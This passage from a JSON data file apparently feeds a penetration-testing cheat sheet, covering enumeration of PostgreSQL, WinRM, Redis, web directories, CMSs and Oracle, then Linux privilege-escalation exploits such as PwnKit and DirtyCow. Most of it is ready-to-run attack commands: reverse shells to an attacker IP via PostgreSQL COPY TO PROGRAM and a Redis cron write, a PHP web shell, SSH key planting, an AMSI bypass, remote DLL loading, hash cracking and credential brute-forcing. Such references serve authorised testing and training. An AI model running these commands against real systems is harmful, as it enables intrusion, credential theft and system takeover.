                  "cmd": [
                    "# Extract hashes",
                    "# SELECT usename, passwd FROM pg_shadow;",
                    "",
                    "# PostgreSQL uses MD5: md5 + md5(password + username)",
                    "# Crack with hashcat (mode 12 for PostgreSQL)",
                    "hashcat -m 12 hash.txt /usr/share/wordlists/rockyou.txt"
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force PostgreSQL",
              "entries": [
                {
                  "cmd": [
                    "hydra -L users.txt -P passwords.txt -t 4 postgres://<TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] PostgreSQL version identified? (searchsploit postgresql)",
                    "# [ ] Connected with found/default credentials?",
                    "# [ ] Current user is superuser? (COPY TO PROGRAM available)",
                    "# [ ] Credential tables found in databases?",
                    "# [ ] File read possible? (pg_read_file, COPY FROM)",
                    "# [ ] Web root known? (web shell via COPY TO)",
                    "# [ ] Password hashes extracted from pg_shadow?"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Connection",
              "entries": [
                {
                  "cmd": [
                    "# Connect with credentials",
                    "psql -h <TARGET-IP> -p 5432 -U <USERNAME> -d <DATABASE>",
                    "",
                    "# Connect with password prompt",
                    "psql -h <TARGET-IP> -U <USERNAME> -W",
                    "",
                    "# Default credentials to try: postgres:postgres, postgres:(blank)"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Enumeration",
              "entries": [
                {
                  "cmd": [
                    "-- Version",
                    "SELECT version();",
                    "",
                    "-- Current user and privileges",
                    "SELECT current_user;",
                    "SELECT current_setting('is_superuser');",
                    "",
                    "-- List all databases",
                    "\\l",
                    "-- Or: SELECT datname FROM pg_database;",
                    "",
                    "-- Connect to a database",
                    "\\c <database>",
                    "",
                    "-- List all tables in current database",
                    "\\dt",
                    "-- Or: SELECT table_name FROM information_schema.tables WHERE table_schema='public';",
                    "",
                    "-- Describe a table",
                    "\\d <table>",
                    "",
                    "-- Dump table contents",
                    "SELECT * FROM <table>;",
                    "",
                    "-- List all users and roles",
                    "SELECT usename, usesuper FROM pg_user;",
                    "\\du",
                    "",
                    "-- Expand display for wider tables",
                    "\\x on"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Command Execution (if superuser)",
              "entries": [
                {
                  "cmd": [
                    "-- Read files from the server",
                    "SELECT pg_read_file('/etc/passwd');",
                    "COPY (SELECT '') TO PROGRAM 'id';",
                    "",
                    "-- Write files to the server",
                    "COPY (SELECT 'test') TO '/tmp/test.txt';",
                    "",
                    "-- Execute OS commands (requires superuser)",
                    "DROP TABLE IF EXISTS cmd_output;",
                    "CREATE TABLE cmd_output(output text);",
                    "COPY cmd_output FROM PROGRAM 'id';",
                    "SELECT * FROM cmd_output;",
                    "",
                    "-- Reverse shell via COPY TO PROGRAM",
                    "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1\"';"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-25",
          "name": "WinRM Enumeration (5985/5986)",
          "description": "WinRM (Windows Remote Management) runs on TCP port 5985 (HTTP) and TCP port 5986 (HTTPS). It is Microsoft’s implementation of WS-Management and provides remote PowerShell access to Windows machines. WinRM is a critical lateral movement and remote access vector — if you have valid credentials or an NTLM hash for a user in the Remote Management Users group (or local admin), you get a full interactive PowerShell session. Tip: Always spray found credentials against WinRM. Evil-WinRM gives you a PowerShell shell with built-in upload/download and Kerberos support — it’s the preferred tool for Windows post-exploitation.",
          "commands": [
            {
              "desc": "Nmap Enumeration",
              "entries": [
                {
                  "cmd": [
                    "nmap -sV -p 5985,5986 <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Connecting with Evil-WinRM",
              "entries": [
                {
                  "cmd": [
                    "evil-winrm -i <TARGET-IP> -u <USER> -p '<PASSWORD>'",
                    "",
                    "# Domain user",
                    "evil-winrm -i <TARGET-IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>"
                  ],
                  "subdesc": "With Password"
                },
                {
                  "cmd": [
                    "evil-winrm -i <TARGET-IP> -u <USER> -H <NTLM-HASH>"
                  ],
                  "subdesc": "With NTLM Hash (Pass-the-Hash)"
                },
                {
                  "cmd": [
                    "evil-winrm -i <TARGET-IP> -r <DOMAIN> -u <USER>"
                  ],
                  "subdesc": "With Kerberos Ticket"
                }
              ]
            },
            {
              "desc": "Evil-WinRM Built-in Features",
              "entries": [
                {
                  "subdesc": "Once connected, Evil-WinRM provides several built-in commands:",
                  "cmd": [
                    "# Upload file to target",
                    "upload /path/to/local/file.exe C:\\Windows\\Temp\\file.exe",
                    "",
                    "# Download file from target",
                    "download C:\\Users\\Administrator\\Desktop\\proof.txt /tmp/proof.txt",
                    "",
                    "# Load PowerShell scripts into session",
                    "menu",
                    "Bypass-4MSI    # AMSI bypass attempt",
                    "",
                    "# Execute .NET assemblies in memory",
                    "Dll-Loader -http http://<ATTACKER-IP>/payload.dll"
                  ]
                }
              ]
            },
            {
              "desc": "CrackMapExec WinRM Validation",
              "entries": [
                {
                  "subdesc": "Before connecting, verify WinRM access with CrackMapExec:",
                  "cmd": [
                    "# Check if credentials work for WinRM (Pwn3d! = admin access)",
                    "crackmapexec winrm <TARGET-IP> -u <USER> -p '<PASSWORD>'",
                    "crackmapexec winrm <TARGET-IP> -u <USER> -H <NTLM-HASH>",
                    "",
                    "# Spray credentials",
                    "crackmapexec winrm <TARGET-IP> -u users.txt -p passwords.txt",
                    "",
                    "# Execute commands",
                    "crackmapexec winrm <TARGET-IP> -u <USER> -p '<PASSWORD>' -x 'whoami'",
                    "crackmapexec winrm <TARGET-IP> -u <USER> -p '<PASSWORD>' -X 'Get-Process'  # PowerShell"
                  ]
                }
              ]
            },
            {
              "desc": "PowerShell Remoting (Native)",
              "entries": [
                {
                  "subdesc": "From a Windows machine with credentials:",
                  "cmd": [
                    "# Create credential object",
                    "$cred = Get-Credential",
                    "",
                    "# Interactive session",
                    "Enter-PSSession -ComputerName <TARGET-IP> -Credential $cred",
                    "",
                    "# Execute command remotely",
                    "Invoke-Command -ComputerName <TARGET-IP> -Credential $cred -ScriptBlock { whoami }"
                  ]
                }
              ]
            },
            {
              "desc": "WinRM Access Requirements",
              "entries": [
                {
                  "subdesc": "WinRM access requires: 1. Valid credentials (password or NTLM hash) 2. User must be in one of: Local Administrators group Remote Management Users group 3. WinRM service must be running on the target",
                  "cmd": [
                    "# Check who has WinRM access (on target)",
                    "Get-LocalGroupMember -Group \"Remote Management Users\"",
                    "net localgroup \"Remote Management Users\""
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force WinRM",
              "entries": [
                {
                  "cmd": [
                    "crackmapexec winrm <TARGET-IP> -u users.txt -p passwords.txt"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] WinRM port open? (5985/5986)",
                    "# [ ] Valid credentials found? (password or hash)",
                    "# [ ] CrackMapExec shows `Pwn3d!`? (admin access)",
                    "# [ ] Evil-WinRM session established?",
                    "# [ ] Upload tools for post-exploitation?",
                    "# [ ] Check for other machines with same credentials?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-26",
          "name": "Redis Enumeration (6379)",
          "description": "Redis (Remote Dictionary Server) runs on TCP port 6379 and is an in-memory data structure store used as a database, cache, and message broker. Redis is frequently unauthenticated by default, making it a high-value target. Attackers can read/write arbitrary data, write SSH keys for access, write web shells, and abuse replication for RCE. Tip: Unauthenticated Redis is an immediate win. If you can connect without a password, check for sensitive data in keys and attempt SSH key or web shell writes for initial access.",
          "commands": [
            {
              "desc": "Connecting to Redis",
              "entries": [
                {
                  "cmd": [
                    "redis-cli -h <TARGET-IP>",
                    "redis-cli -h <TARGET-IP> -p 6379"
                  ],
                  "subdesc": "redis-cli"
                },
                {
                  "subdesc": "redis-cli — If authentication is required:",
                  "cmd": [
                    "redis-cli -h <TARGET-IP> -a <PASSWORD>",
                    "# Or after connecting:",
                    "AUTH <PASSWORD>"
                  ]
                },
                {
                  "cmd": [
                    "nmap -sV -p 6379 --script redis-info <TARGET-IP>"
                  ],
                  "subdesc": "Nmap Enumeration"
                }
              ]
            },
            {
              "desc": "Information Gathering",
              "entries": [
                {
                  "subdesc": "Once connected, gather system and configuration details:",
                  "cmd": [
                    "# Server info (version, OS, architecture, config file path)",
                    "INFO server",
                    "",
                    "# All info sections",
                    "INFO",
                    "",
                    "# List all configuration",
                    "CONFIG GET *",
                    "",
                    "# Check if authentication is required",
                    "CONFIG GET requirepass",
                    "",
                    "# Database size",
                    "DBSIZE",
                    "",
                    "# List all keys in current database",
                    "KEYS *",
                    "",
                    "# Get value of a specific key",
                    "GET <KEY-NAME>",
                    "",
                    "# Check key type",
                    "TYPE <KEY-NAME>"
                  ]
                }
              ]
            },
            {
              "desc": "Exploitation — Write SSH Key",
              "entries": [
                {
                  "subdesc": "If Redis runs as a user with a home directory, write your SSH public key for access:",
                  "cmd": [
                    "# Generate SSH key pair on attacker machine",
                    "ssh-keygen -t rsa -f redis_key",
                    "",
                    "# Prepare the key with padding (Redis adds junk around the value)",
                    "(echo -e \"\\n\\n\"; cat redis_key.pub; echo -e \"\\n\\n\") > payload.txt",
                    "",
                    "# Write it into Redis",
                    "cat payload.txt | redis-cli -h <TARGET-IP> -x set crackit",
                    "",
                    "# Configure Redis to write to the target's authorized_keys",
                    "redis-cli -h <TARGET-IP>",
                    "CONFIG SET dir /home/<USER>/.ssh/",
                    "CONFIG SET dbfilename \"authorized_keys\"",
                    "SAVE"
                  ]
                },
                {
                  "subdesc": "Then connect:",
                  "cmd": [
                    "ssh -i redis_key <USER>@<TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Exploitation — Write Web Shell",
              "entries": [
                {
                  "subdesc": "If the web root is writable from the Redis process:",
                  "cmd": [
                    "redis-cli -h <TARGET-IP>",
                    "CONFIG SET dir /var/www/html/",
                    "CONFIG SET dbfilename \"shell.php\"",
                    "SET payload 'your-webshell-code-here'",
                    "SAVE"
                  ]
                }
              ]
            },
            {
              "desc": "Exploitation — Cron Job (Linux)",
              "entries": [
                {
                  "subdesc": "Write a reverse shell to a cron directory:",
                  "cmd": [
                    "redis-cli -h <TARGET-IP>",
                    "SET payload \"\\n\\n*/1 * * * * bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1\\n\\n\"",
                    "CONFIG SET dir /var/spool/cron/crontabs/",
                    "CONFIG SET dbfilename root",
                    "SAVE"
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force Redis Password",
              "entries": [
                {
                  "cmd": [
                    "hydra -P /usr/share/wordlists/rockyou.txt redis://<TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Or with Nmap:",
                  "cmd": [
                    "nmap -p 6379 --script redis-brute <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] Unauthenticated access? (`redis-cli -h <IP>` then `INFO`)",
                    "# [ ] Sensitive data in keys? (`KEYS *` then `GET <key>`)",
                    "# [ ] Redis user has a home directory? (SSH key write)",
                    "# [ ] Web root writable? (web shell write)",
                    "# [ ] Redis runs as root? (cron job exploitation)",
                    "# [ ] Redis version vulnerable? (`searchsploit redis`)"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Redis (6379)",
              "entries": [
                {
                  "subdesc": "Covered in detail on the Port Enumeration page. Quick reference for database context:",
                  "cmd": [
                    "# Connect",
                    "redis-cli -h <TARGET-IP> -p 6379",
                    "",
                    "# If auth required",
                    "redis-cli -h <TARGET-IP> -p 6379 -a <PASSWORD>",
                    "",
                    "# Enumerate",
                    "INFO",
                    "CONFIG GET *",
                    "KEYS *",
                    "GET <key>",
                    "",
                    "# Dump all databases",
                    "SELECT 0",
                    "KEYS *"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-27",
          "name": "Directory Brute-Forcing",
          "description": "Directory Brute-Forcing",
          "commands": [
            {
              "desc": "Feroxbuster (Recommended — Fastest, Recursive)",
              "entries": [
                {
                  "subdesc": "Run first. Feroxbuster is the fastest directory brute-forcer with built-in recursion. Always start with this. Install: apt install feroxbuster.",
                  "cmd": [
                    "# Standard directory brute-force with common extensions",
                    "feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,conf -t 100 -o feroxbuster_output.txt",
                    "",
                    "# With authentication (cookie-based)",
                    "feroxbuster -u http://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -b \"PHPSESSID=abc123\" -t 50",
                    "",
                    "# Force specific status codes to include",
                    "feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200,301,302,403 -x php,txt"
                  ]
                }
              ]
            },
            {
              "desc": "GoBuster (Fast, Reliable)",
              "entries": [
                {
                  "subdesc": "Alternative to Feroxbuster. Use when you need more control over status codes or DNS/vhost modes. No recursion built-in.",
                  "cmd": [
                    "# Directory enumeration",
                    "gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50 -o gobuster_dir.txt",
                    "",
                    "# With authentication header",
                    "gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -H \"Authorization: Bearer <TOKEN>\" -x php",
                    "",
                    "# With specific status codes",
                    "gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,bak --status-codes-blacklist 404 -t 40"
                  ]
                }
              ]
            },
            {
              "desc": "FFUF (Flexible, Supports Multiple Positions)",
              "entries": [
                {
                  "subdesc": "Most versatile fuzzer. Use for directory fuzzing, parameter fuzzing, subdomain discovery, and any position where you need to inject a wordlist. Master the -fs, -fc, -fw filters to eliminate false positives.",
                  "cmd": [
                    "# Basic directory fuzzing",
                    "ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ffuf_output.txt",
                    "",
                    "# Fuzzing with extensions",
                    "ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.html,.txt,.bak,.conf -fc 404",
                    "",
                    "# Filter by response size (useful for eliminating false positives)",
                    "ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 1234",
                    "",
                    "# Filter by number of words in response",
                    "ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fw 42"
                  ]
                }
              ]
            },
            {
              "desc": "Dirsearch (Python-based, Lots of Built-in Extensions)",
              "entries": [
                {
                  "subdesc": "Quick and simple. Good for a fast initial sweep. Has smart extension handling built-in.",
                  "cmd": [
                    "dirsearch -u http://<TARGET> -e php,html,txt -t 50 --format=simple -o dirsearch_output.txt"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-28",
          "name": "Subdomain & Virtual Host Enumeration",
          "description": "Subdomain & Virtual Host Enumeration",
          "commands": [
            {
              "desc": "FFUF — Subdomain Fuzzing",
              "entries": [
                {
                  "subdesc": "Use to discover subdomains and virtual hosts. For vhost fuzzing, use -fs to filter out the default response size (run once without filter to see it).",
                  "cmd": [
                    "# Subdomain brute-force via DNS",
                    "ffuf -u http://FUZZ.<TARGET-DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 404",
                    "",
                    "# Virtual Host fuzzing (for targets that resolve to same IP)",
                    "ffuf -u http://<TARGET-IP> -H \"Host: FUZZ.<TARGET-DOMAIN>\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <DEFAULT-SIZE>"
                  ]
                }
              ]
            },
            {
              "desc": "GoBuster — DNS & VHost",
              "entries": [
                {
                  "subdesc": "DNS mode for external subdomain discovery, VHost mode for virtual hosts on same IP. Use --append-domain to auto-append the base domain.",
                  "cmd": [
                    "# DNS subdomain brute-force",
                    "gobuster dns -d <TARGET-DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50",
                    "",
                    "# Virtual host enumeration",
                    "gobuster vhost -u http://<TARGET-DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-29",
          "name": "Git Repository Discovery",
          "description": "Always check for exposed .git directories. These leak full source code, commit history, and often credentials. This is a common finding in engagements. Exposed .git directories can leak source code, credentials, and internal documentation.",
          "commands": [
            {
              "desc": "Git Repository Discovery",
              "entries": [
                {
                  "subdesc": "Always check for exposed .git directories. These leak full source code, commit history, and often credentials. This is a common finding in engagements. Exposed .git directories can leak source code, credentials, and internal documentation.",
                  "cmd": [
                    "# Check for exposed .git directory",
                    "curl -s http://<TARGET>/.git/HEAD",
                    "",
                    "# Dump the entire repository using git-dumper",
                    "git-dumper http://<TARGET>/.git ./git_dump",
                    "",
                    "# Search dumped repo for secrets",
                    "gitleaks detect --source ./git_dump -v",
                    "",
                    "# Alternative: trufflehog for secret scanning",
                    "trufflehog filesystem ./git_dump"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-30",
          "name": "API Enumeration",
          "description": "Test API endpoints for IDOR, auth bypass, and method tampering. Try different HTTP methods (GET/POST/PUT/DELETE) and check if you can escalate privileges by modifying user IDs or roles.",
          "commands": [
            {
              "desc": "API Enumeration",
              "entries": [
                {
                  "subdesc": "Test API endpoints for IDOR, auth bypass, and method tampering. Try different HTTP methods (GET/POST/PUT/DELETE) and check if you can escalate privileges by modifying user IDs or roles.",
                  "cmd": [
                    "# Fuzz API endpoints",
                    "ffuf -u http://<TARGET>/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404",
                    "",
                    "# Test API methods (POST, PUT, DELETE)",
                    "curl -X POST http://<TARGET>/api/users -H \"Content-Type: application/json\" -d '{\"username\":\"test\",\"password\":\"test\"}'",
                    "curl -X PUT http://<TARGET>/api/users/1 -H \"Content-Type: application/json\" -d '{\"role\":\"admin\"}'",
                    "",
                    "# JWT token testing — decode and inspect",
                    "echo '<JWT-TOKEN>' | cut -d '.' -f 2 | base64 -d 2>/dev/null | jq ."
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-31",
          "name": "Content Management System (CMS) Scanning",
          "description": "Content Management System (CMS) Scanning",
          "commands": [
            {
              "desc": "WordPress",
              "entries": [
                {
                  "subdesc": "Most common CMS in engagements. Always enumerate plugins — vulnerable plugins are the primary attack vector. Get a free API token from wpscan.com for vulnerability data.",
                  "cmd": [
                    "# Full WordPress enumeration (users, plugins, themes, timthumbs)",
                    "wpscan --url http://<TARGET> --enumerate ap,at,u,tt --api-token <YOUR_API_TOKEN> -o wpscan_output.txt",
                    "",
                    "# Brute-force WordPress login",
                    "wpscan --url http://<TARGET> --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 20",
                    "",
                    "# Exploit WordPress theme editor for shell upload:",
                    "# Appearance → Theme Editor → 404.php",
                    "# Replace content with: <?php system($_GET['cmd']); ?>",
                    "# Trigger: http://<TARGET>/wp-content/themes/<THEME>/404.php?cmd=whoami"
                  ]
                }
              ]
            },
            {
              "desc": "Drupal",
              "entries": [
                {
                  "subdesc": "Check Drupal version immediately — Drupalgeddon (CVE-2018-7600) and Drupalgeddon2 affect many versions and give RCE.",
                  "cmd": [
                    "# Droopescan — Drupal, Joomla, SilverStripe scanner",
                    "droopescan scan drupal -u http://<TARGET> -t 32"
                  ]
                }
              ]
            },
            {
              "desc": "Joomla",
              "entries": [
                {
                  "subdesc": "Use JoomScan to identify version and vulnerable extensions. Check for known CVEs against the discovered version.",
                  "cmd": [
                    "# JoomScan — dedicated Joomla vulnerability scanner",
                    "joomscan -u http://<TARGET>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-32",
          "name": "Technology Fingerprinting",
          "description": "When to run: First thing after discovering HTTP/HTTPS. Knowing the tech stack guides your enumeration and exploit selection.",
          "commands": [
            {
              "desc": "Technology Fingerprinting",
              "entries": [
                {
                  "subdesc": "When to run: First thing after discovering HTTP/HTTPS. Knowing the tech stack guides your enumeration and exploit selection.",
                  "cmd": [
                    "# WhatWeb — identifies CMS, frameworks, server software, JS libraries",
                    "whatweb http://<TARGET>",
                    "whatweb -a 3 http://<TARGET>  # Aggressive mode (more requests, more detail)",
                    "",
                    "# Wappalyzer — browser extension alternative (install in Firefox/Chrome)",
                    "# Automatically shows tech stack when browsing",
                    "",
                    "# HTTP headers — manual fingerprinting",
                    "curl -I http://<TARGET>",
                    "# Look for: Server, X-Powered-By, X-AspNet-Version, Set-Cookie (framework hints)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-33",
          "name": "Nikto (Web Vulnerability Scanner)",
          "description": "Purpose: Scans for dangerous files, outdated server software, and common misconfigurations. Noisy but thorough — finds things directory brute-force misses.",
          "commands": [
            {
              "desc": "Nikto (Web Vulnerability Scanner)",
              "entries": [
                {
                  "subdesc": "Purpose: Scans for dangerous files, outdated server software, and common misconfigurations. Noisy but thorough — finds things directory brute-force misses.",
                  "cmd": [
                    "# Basic scan",
                    "nikto -h http://<TARGET>",
                    "",
                    "# Scan specific port",
                    "nikto -h http://<TARGET>:<PORT>",
                    "",
                    "# Scan HTTPS",
                    "nikto -h https://<TARGET> -ssl",
                    "",
                    "# Save output",
                    "nikto -h http://<TARGET> -o nikto_output.txt -Format txt",
                    "",
                    "# Scan with authentication",
                    "nikto -h http://<TARGET> -id admin:password"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-34",
          "name": "robots.txt / sitemap.xml / Security Headers",
          "description": "When to check: Always. These files reveal hidden directories, admin panels, and API endpoints that aren’t linked from the main site.",
          "commands": [
            {
              "desc": "robots.txt / sitemap.xml / Security Headers",
              "entries": [
                {
                  "subdesc": "When to check: Always. These files reveal hidden directories, admin panels, and API endpoints that aren’t linked from the main site.",
                  "cmd": [
                    "# Check robots.txt for disallowed paths",
                    "curl http://<TARGET>/robots.txt",
                    "",
                    "# Check sitemap for all indexed URLs",
                    "curl http://<TARGET>/sitemap.xml",
                    "curl http://<TARGET>/sitemap_index.xml",
                    "",
                    "# Other common files to check",
                    "curl http://<TARGET>/.htaccess",
                    "curl http://<TARGET>/crossdomain.xml",
                    "curl http://<TARGET>/clientaccesspolicy.xml",
                    "curl http://<TARGET>/.well-known/security.txt",
                    "",
                    "# Security headers check (missing headers = findings for report)",
                    "curl -I http://<TARGET> | grep -iE \"x-frame|x-content|x-xss|strict-transport|content-security|referrer-policy\""
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-35",
          "name": "Burp Suite Quick Reference",
          "description": "Purpose: Burp Suite is essential for manual web testing in engagements. Use the proxy to intercept requests, Repeater to modify and replay them, and Intruder for targeted brute-force.",
          "commands": [
            {
              "desc": "Setup",
              "entries": [
                {
                  "cmd": [
                    "1. Start Burp Suite Community Edition",
                    "2. Proxy → Options → confirm listener on 127.0.0.1:8080",
                    "3. Configure browser proxy to 127.0.0.1:8080",
                    "4. Browse to http://burpsuite and install the CA certificate for HTTPS interception",
                    "5. Target → Scope → Add target URL to scope",
                    "6. Proxy → Options → enable \"Intercept requests based on scope\""
                  ]
                }
              ]
            },
            {
              "desc": "Useful Tips",
              "entries": [
                {
                  "cmd": [
                    "# Bypass 403 Forbidden — try these header modifications in Repeater:",
                    "X-Forwarded-For: 127.0.0.1",
                    "X-Original-URL: /admin",
                    "X-Rewrite-URL: /admin",
                    "",
                    "# Cookie manipulation for auth bypass",
                    "# Intercept login response → modify Set-Cookie values → Forward",
                    "",
                    "# View all requests/responses: Proxy → HTTP History (filter by scope)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-36",
          "name": "Oracle / TNS (1521)",
          "description": "Tools: odat, tnscmd10g, sqlplus, Nmap scripts",
          "commands": [
            {
              "desc": "Enumeration",
              "entries": [
                {
                  "cmd": [
                    "# Nmap scripts for Oracle",
                    "nmap --script oracle-tns-version,oracle-sid-brute,oracle-brute -p 1521 <TARGET-IP>",
                    "",
                    "# tnscmd10g — get Oracle version",
                    "tnscmd10g version -h <TARGET-IP> -p 1521",
                    "",
                    "# odat — comprehensive Oracle enumeration and exploitation",
                    "# Install: pip3 install odat",
                    "odat all -s <TARGET-IP> -p 1521",
                    "",
                    "# SID enumeration (required before connecting)",
                    "odat sidguesser -s <TARGET-IP> -p 1521",
                    "",
                    "# Brute-force credentials for a known SID",
                    "odat passwordguesser -s <TARGET-IP> -p 1521 -d <SID>",
                    "",
                    "# Connect with sqlplus",
                    "sqlplus <USER>/<PASS>@<TARGET-IP>:<PORT>/<SID>",
                    "# Default creds to try: scott/tiger, sys/change_on_install, system/manager"
                  ]
                }
              ]
            },
            {
              "desc": "Post-Authentication",
              "entries": [
                {
                  "cmd": [
                    "-- Version",
                    "SELECT * FROM v$version;",
                    "",
                    "-- Current user",
                    "SELECT user FROM dual;",
                    "",
                    "-- List all users",
                    "SELECT username FROM all_users;",
                    "",
                    "-- List all tables",
                    "SELECT table_name FROM all_tables;",
                    "",
                    "-- DBA role check (if DBA, you can do anything)",
                    "SELECT * FROM user_role_privs;"
                  ]
                }
              ]
            },
            {
              "desc": "Command Execution via odat",
              "entries": [
                {
                  "cmd": [
                    "# Upload a file",
                    "odat utlfile -s <TARGET-IP> -p 1521 -d <SID> -U <USER> -P <PASS> --putFile /tmp shell.txt <LOCAL-FILE>",
                    "",
                    "# Execute OS commands (requires DBA)",
                    "odat externaltable -s <TARGET-IP> -p 1521 -d <SID> -U <USER> -P <PASS> --exec /tmp shell.txt"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-37",
          "name": "SQLite (File-Based)",
          "description": "When encountered: Found as .db, .sqlite, .sqlite3 files on compromised targets. No network service — accessed directly on disk.",
          "commands": [
            {
              "desc": "SQLite (File-Based)",
              "entries": [
                {
                  "subdesc": "When encountered: Found as .db, .sqlite, .sqlite3 files on compromised targets. No network service — accessed directly on disk.",
                  "cmd": [
                    "# Open a database file",
                    "sqlite3 <database.db>",
                    "",
                    "# List databases and tables",
                    ".databases",
                    ".tables",
                    "",
                    "# Describe table schema",
                    ".schema <table>",
                    "",
                    "# Dump table contents",
                    "SELECT * FROM <table>;",
                    "",
                    "# Search for credentials",
                    "SELECT * FROM users;",
                    "SELECT sql FROM sqlite_master;",
                    "",
                    "# Exit",
                    ".quit"
                  ]
                }
              ]
            }
          ]
        }
    ]
  },

  /* ─── Phase 3: Exploitation ───────────────────────────── */
  {
    "id": "exploitation",
    "name": "Exploitation",
    "optional": false,
    "items": [
        {
          "id": "exploit-1",
          "name": "CVE-2021-4034 — PwnKit (pkexec SUID Privilege Escalation)",
          "description": "Type: Local Privilege Escalation<br>Affected: Polkit’s pkexec — virtually ALL Linux distributions since May 2009<br>CVSS: 7.8 (High)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "# pkexec is almost always SUID root",
                    "ls -la /usr/bin/pkexec",
                    "# Check polkit version",
                    "dpkg -l policykit-1 2>/dev/null || rpm -q polkit 2>/dev/null"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "# Using the C exploit (most reliable)",
                    "git clone https://github.com/berdav/CVE-2021-4034",
                    "cd CVE-2021-4034",
                    "make",
                    "./cve-2021-4034",
                    "",
                    "# Python one-liner version (no compilation needed)",
                    "curl -fsSL https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py -o pwnkit.py",
                    "python3 pwnkit.py"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-2",
          "name": "CVE-2022-0847 — DirtyPipe (Kernel Arbitrary File Write)",
          "description": "Type: Local Privilege Escalation<br>Affected: Linux kernel 5.8 through 5.16.11, 5.15.25, 5.10.102<br>CVSS: 7.8 (High)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "uname -r",
                    "# Vulnerable if kernel version is between 5.8 and 5.16.11"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit",
                    "cd CVE-2022-0847-DirtyPipe-Exploit",
                    "python3 exploit.py",
                    "# Overwrites /etc/passwd to set root password, then runs su"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-3",
          "name": "CVE-2016-5195 — DirtyCow (Kernel Race Condition)",
          "description": "Type: Local Privilege Escalation<br>Affected: Linux kernel \\< 4.8.3 (virtually all kernels from 2007–2016)<br>CVSS: 7.8 (High)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "uname -r",
                    "# Vulnerable if kernel < 4.8.3"
                  ]
                }
              ]
            },
            {
              "desc": "Exploit",
              "entries": [
                {
                  "cmd": [
                    "# passwd overwrite variant (most stable)",
                    "git clone https://github.com/firefart/dirtycow",
                    "cd dirtycow",
                    "gcc -pthread dirty.c -o dirty -lcrypt",
                    "./dirty <new-password>",
                    "# Creates user 'firefart' with root privileges",
                    "su firefart"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-4",
          "name": "CVE-2021-3156 — Baron Samedit (Sudo Heap Overflow)",
          "description": "Type: Local Privilege Escalation<br>Affected: Sudo 1.8.2 through 1.8.31p2, 1.9.0 through 1.9.5p1<br>CVSS: 7.8 (High)",
          "commands": [
            {
              "desc": "Check if Vulnerable",
              "entries": [
                {
                  "cmd": [
                    "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')",
